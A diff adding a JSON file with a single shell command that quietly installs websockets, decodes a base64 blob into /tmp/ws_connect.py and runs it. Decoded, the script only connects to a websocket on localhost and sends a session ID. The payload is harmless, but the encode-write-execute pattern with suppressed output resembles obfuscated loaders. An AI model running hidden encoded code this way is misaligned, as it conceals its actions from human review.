@@ -1,0 +1,5 @@
+{
+  "commands": [
+    "python3 -m pip install websockets -q 2>/dev/null; echo aW1wb3J0IGFzeW5jaW8sIHdlYnNvY2tldHMKc2lkID0gJ2NjZTc2ZDI3LWI4NWEtNGZjMi1iZjk2LTkyYmQzMTk1NDI3MScKYXN5bmMgZGVmIHJ1bigpOgogIHRyeToKICAgIGFzeW5jIHdpdGggd2Vic29ja2V0cy5jb25uZWN0KCd3czovLzEyNy4wLjAuMTo4NzY1Jywgb3Blbl90aW1lb3V0PTUsIGNsb3NlX3RpbWVvdXQ9MikgYXMgd3M6CiAgICAgIGF3YWl0IHdzLnNlbmQoJ2Zyb250ZW5kOicgKyBzaWQpCiAgICAgIHIgPSBhd2FpdCBhc3luY2lvLndhaXRfZm9yKHdzLnJlY3YoKSwgMykKICAgICAgcHJpbnQoJ1JFUExZOicsIHIpCiAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgcHJpbnQoJ0VSUk9SOicsIGUpCmFzeW5jaW8ucnVuKHJ1bigpKQ== | base64 -d > /tmp/ws_connect.py && python3 /tmp/ws_connect.py 2>&1"
+  ]
+}
